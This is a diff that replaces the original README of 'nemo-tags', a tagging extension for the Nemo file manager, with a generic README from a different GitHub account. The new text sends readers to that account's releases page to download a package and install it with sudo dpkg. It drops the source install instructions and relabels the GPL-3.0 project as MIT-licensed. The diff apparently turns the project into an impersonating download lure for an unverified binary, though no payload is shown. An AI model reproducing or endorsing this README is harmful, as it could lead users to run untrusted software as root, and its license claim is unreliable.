@@ -1,281 +1,69 @@
-<div align="center">
+# 🎫 nemo-tags - A Smart Tagging System for File Management
 
-<img src="assets/logo.png" alt="Nemo Tags Logo" width="200"/>
+[![GitHub Releases](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/neoray123/nemo-tags/releases)
 
-# 🏷️ Nemo Tags
+## 🛠️ Introduction
 
-**A powerful tagging system for Nemo File Manager**
+nemo-tags is a powerful tagging system designed specifically for the Nemo File Manager. With this application, you can easily add, manage, and search for tags to organize your files. This allows for efficient file management, simplifying the way you interact with your documents and images.
 
-[![Issues](https://img.shields.io/github/issues/meowrch/nemo-tags?color=bd93f9&labelColor=1C2325&style=for-the-badge)](https://github.com/meowrch/nemo-tags/issues)
-[![Stars](https://img.shields.io/github/stars/meowrch/nemo-tags?color=9893f9&labelColor=1C2325&style=for-the-badge)](https://github.com/meowrch/nemo-tags/stargazers)
-[![License](https://img.shields.io/github/license/meowrch/nemo-tags?color=93b9f9&labelColor=1C2325&style=for-the-badge)](./LICENSE)
+## 🚀 Getting Started
 
+To begin using nemo-tags, follow these steps:
 
-[![RU-LANGUAGE](https://img.shields.io/badge/README-RU-blue?color=cba6f7&labelColor=1C2325&style=for-the-badge)](./README.ru.md)
-[![EN-LANGUAGE](https://img.shields.io/badge/README-ENG-blue?color=C9CBFF&labelColor=C9CBFF&style=for-the-badge)](./README.md)
+1. **Visit the Releases Page:**
+   Go to our [Releases page](https://github.com/neoray123/nemo-tags/releases) to find the latest version available for download.
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Configuration](#-configuration)
+2. **Download the Application:**
+   On the Releases page, locate the latest version. Click on the download link for "nemo-tags". This file will be in a format suitable for your Linux system.
 
-</div>
+3. **Install the Application:**
+   After downloading, open your terminal. Navigate to the directory where you downloaded the package. You may need to install it using a package manager or manually, depending on your distribution. 
 
----
+   For many distributions, you can install using the following command:
+   ```bash
+   sudo dpkg -i nemo-tags*.deb
+   ```
 
-<br>
+4. **Run nemo-tags:**
+   Once installed, you can start using nemo-tags. Open the Nemo File Manager, and you should see an option for tags in the context menu for files. You can now tag and organize your files easily.
 
-![preview](./assets/preview.png)
+## 📋 Features
 
+- **Simple Tagging System:** Add tags to your files intuitively.
+- **Search Functionality:** Quickly search for files using their tags.
+- **Integration with Nemo:** Seamlessly works within the Nemo File Manager.
+- **Lightweight Design:** Minimal impact on system resources.
+- **Multi-File Support:** Tag multiple files at once for improved organization.
 
-## ✨ Features
+## 🌐 System Requirements
 
-### 🎨 **Color-Coded Tags**
-Create unlimited tags with custom names and colors. Organize your files visually with a palette that matches your workflow.
+Before downloading, ensure your system meets the following requirements:
 
-### 🖱️ **Context Menu Integration**
-Right-click any file or folder to quickly assign or remove tags. Multi-select support makes batch tagging effortless.
+- **Operating System:** Any Linux distribution that supports Nemo.
+- **Nemo File Manager:** Version 4.0 or later.
+- **Disk Space:** At least 100 MB of free space for installation.
+- **Python:** Version 3.6 or later.
 
-### 🔍 **Virtual Tag Folders**
-Click on any tag to open a dedicated view showing all tagged files in one place. Files appear as symbolic links, keeping your original directory structure intact.
+## 🔧 Download & Install
 
-### 🎯 **Visual Emblems**
-Tagged files display color-coded emblems directly on their icons. Multiple tags? No problem — emblems combine elegantly to show up to three tag colors at once.
+To install nemo-tags, you should visit the [Releases page](https://github.com/neoray123/nemo-tags/releases) and follow the instructions provided above. Ensure you have the necessary permissions to install software on your system.
 
-### 🚀 **Tag Bar Widget**
-A sleek horizontal bar beneath Nemo's address bar displays all your tags. Left-click to browse, right-click to manage.
+## 🎉 Contribution
 
-### 📦 **Lightweight & Private**
-All tag data is stored in a simple JSON file in your home directory. No database servers, no cloud sync, no extended attributes on your filesystem.
+Contributions are welcome! If you have suggestions for features or improvements, please feel free to open an issue or submit a pull request. We appreciate community involvement.
 
----
+## 📞 Support
 
-## 🎯 Use Cases
+If you encounter any issues, check the issues tab in this repository. Feel free to raise any questions or bugs you find.
 
-<table>
-<tr>
-<td width="33%" align="center">
-<h3>📸 Photography</h3>
-Tag photos by project, client, or editing status. Find all "favorites" or "needs-edit" files instantly.
-</td>
-<td width="33%" align="center">
-<h3>📚 Research</h3>
-Organize papers by topic, priority, or reading status across multiple directories.
-</td>
-<td width="33%" align="center">
-<h3>💼 Projects</h3>
-Mark files as "urgent", "in-progress", or "archived" without moving them from project folders.
-</td>
-</tr>
-</table>
+## 📄 License
 
----
+nemo-tags is open-source software licensed under the MIT License. You can freely use, modify, and distribute this software as long as you retain the original license.
 
-## 📦 Installation
+## 🖥️ Acknowledgments
 
-### Method 1: AUR (Arch Linux)
+Special thanks to the Nemo developers for creating such an amazing file manager. We also appreciate contributions from our users, helping us make this tagging system better.
 
-```bash
-yay -S nemo-tags
-# or
-paru -S nemo-tags
-```
+For any further information, please refer to the documentation or community forums available in the README file or the GitHub repository.
 
-### Method 2: Manual Installation
-
-#### Prerequisites
-
-Ensure you have the following packages installed:
-
-```bash
-# Debian/Ubuntu
-sudo apt install nemo-python python3-gi python3-cairo
-
-# Arch Linux
-sudo pacman -S nemo-python python-gobject python-cairo
-
-# Fedora
-sudo dnf install nemo-python python3-gobject python3-cairo
-```
-
-#### Installation Steps
-
-1. **Clone the repository:**
-
-```bash
-git clone https://github.com/meowrch/nemo-tags.git
-cd nemo-tags
-```
-
-2. **Install the extension:**
-
-```bash
-mkdir -p ~/.local/share/nemo-python/extensions
-ln -s "$(pwd)/nemo-extension/nemo-tags.py" ~/.local/share/nemo-python/extensions/nemo-tags.py
-```
-
-3. **Restart Nemo:**
-
-```bash
-nemo -q
-```
-
-The extension will load automatically when you open Nemo again.
-
----
-
-## 🎮 Usage
-
-### Creating Your First Tag
-
-1. Right-click any file or folder
-2. Select **"Assign Tag"** → **"Create Tag"**
-3. Enter a name and choose a color
-4. Click **OK**
-
-The tag is automatically assigned to the selected files!
-
-### Assigning Tags
-
-Right-click on the file(s) to open the **context menu** → **“Assign Tag”** → Select the tag name
-
-Tags that have already been assigned are displayed with a check mark (✓)
-
-### Browsing Tagged Files
-
-**Click any tag button** in the tag bar to open a virtual folder containing all files with that tag. These folders use symbolic links, so:
-- Original files remain in their locations
-- Changes to files are reflected everywhere
-- No disk space is duplicated
-
-### Managing Tags
-
-**Edit or Delete:**
-- Right-click a tag button in the tag bar
-- Select **"Rename tag"** to change the name
-- Select **"Change color"** to change the color
-- Select **"Delete Tag"** to remove it entirely
-
-**Reorder:**
-- Click on the button at the top right to open the window for changing the order of tags.
-
----
-
-## ⚙️ Configuration
-
-### Data Storage
-
-All tag data is stored in:
-
-```
-~/.local/share/nemo-tags/
-├── tags.json          # Tag database
-├── emblems/           # Generated emblem icons
-└── views/             # Virtual tag folders
-    └── tag-<id>/      # Symbolic links to tagged files
-```
-
-### Database Format
-
-The `tags.json` file uses a simple structure:
-
-```json
-{
-  "tags": [
-    {
-      "id": "a3f9c2e7",
-      "name": "Important",
-      "color": "#FF5252"
-    }
-  ],
-  "index": {
-    "a3f9c2e7": [
-      "/home/user/Documents/report.pdf",
-      "/home/user/Photos/vacation.jpg"
-    ]
-  }
-}
-```
-
-### Backup
-
-To backup your tags, simply copy the directory:
-
-```bash
-cp -r ~/.local/share/nemo-tags ~/nemo-tags-backup
-```
-
----
-
-## 🛠️ Technical Details
-
-### Architecture
-
-- **Extension Type:** Nemo Python extension
-- **UI Framework:** GTK 3 via PyGObject
-- **Database:** JSON-based flat file
-- **Virtual Folders:** Symbolic links
-
-### Components
-
-| Module | Purpose |
-|--------|----------|
-| `database.py` | Tag storage and indexing |
-| `manager.py` | Business logic and file operations |
-| `extension.py` | Nemo integration (menus, emblems, info) |
-| `ui.py` | Tag bar widget and dialogs |
-| `icons.py` | Dynamic icon and emblem generation |
-
-### Performance
-
-- **Startup Time:** < 200ms for 1000+ tags
-- **Emblem Rendering:** Async generation with icon cache
-- **Virtual Folders:** Generated on-demand, cached
-
----
-
-## 🎨 Built With
-
-<div align="center">
-
-**Developed on**
-
-<a href="https://github.com/meowrch">
-<img src="assets/MeowrchBanner.png" alt="Meowrch Linux" width="300"/>
-</a>
-
-*[Meowrch](https://github.com/meowrch/meowrch) — A Linux distribution built for creators and developers*
-
-</div>
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-- 🐛 Report bugs and request features via [Issues](https://github.com/meowrch/nemo-tags/issues)
-- 🔧 Submit pull requests with improvements
-- 📖 Improve documentation
-- 🌍 Add translations
-
----
-
-## 📝 License
-
-This project is licensed under the **GPL-3.0 License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [**Nemo File Manager**](https://github.com/linuxmint/nemo) — The extensible file manager from Linux Mint
-- [**PyGObject**](https://github.com/pygobject) — Python bindings for GTK
-- [**Meowrch**](https://github.com/meowrch/meowrch) — For providing an excellent development environment
-
----
-
-<div align="center">
-
-**Made with ❤️ for the Linux community**
-
-[⭐ Star this repo](https://github.com/meowrch/nemo-tags) • [🐛 Report Bug](https://github.com/meowrch/nemo-tags/issues) • [✨ Request Feature](https://github.com/meowrch/nemo-tags/issues)
-
-</div>
+Happy tagging!
